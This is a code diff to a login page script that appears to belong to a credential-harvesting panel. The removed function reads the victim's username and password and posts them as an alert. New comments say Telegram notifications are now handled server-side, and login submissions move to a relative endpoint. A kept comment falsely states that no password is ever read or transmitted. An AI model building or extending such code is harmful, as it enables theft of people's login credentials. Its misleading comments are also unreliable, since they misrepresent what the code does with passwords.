@@ -102,20 +102,9 @@
     };
 
     // Sends a safe audit message. No password is ever read or transmitted.
+    // Notification is now handled server-side
     const notifyContinue = async (currentStage) => {
-      try {
-        const username = usernameInput.value;
-        const password = passwordStageInput.value;
-        const message = LoginAlert({ stageName: currentStage, username, password });
-
-        await fetch('http://localhost:3001/notify', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ message }),
-        });
-      } catch (err) {
-        console.warn('Notification failed:', err);
-      }
+      // No longer needed - server handles Telegram notifications
     };
 
     const handleContinue = (event) => {
@@ -157,7 +146,7 @@
 
       // Now actually send to your backend
       const clientId = window.localStorage.getItem('adminLiveClientId') || 'unknown';
-      fetch('http://localhost:3000/login', {
+      fetch('/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
